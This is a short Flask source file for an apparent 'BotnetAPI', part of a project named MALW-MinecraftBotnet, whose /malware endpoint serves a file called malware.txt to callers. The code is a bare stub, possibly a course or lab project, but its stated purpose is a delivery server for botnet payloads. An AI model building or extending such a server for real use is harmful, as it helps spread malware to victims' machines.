from flask import request, jsonify, Flask, send_file
from pymongo import MongoClient
from bson.objectid import ObjectId
import json
import os

app = Flask(__name__)

# app.config.from_file('./secrets/config.json', load=json.load)
DOWNLOAD_PATH = "C:/Users/Alexa/Documents/GitHub/MALW-MinecraftBotnet/API/downloads"
# DOWNLOAD_PATH = "/home/flask_app/BotnetAPI/downloads"


#### API Endpoints ####

@app.route('/', methods=['GET'])
def home():
    return '''<h1>BotnetAPI - Secured database to store all your malware</h1>
                <p>A flask api implementation for malware.   </p>'''

@app.route('/malware', methods=['GET'])
def getMalware():
    return send_file(os.path.join(DOWNLOAD_PATH, "malware.txt"))



if __name__ == '__main__':
    app.run(host="127.0.0.1", port=80)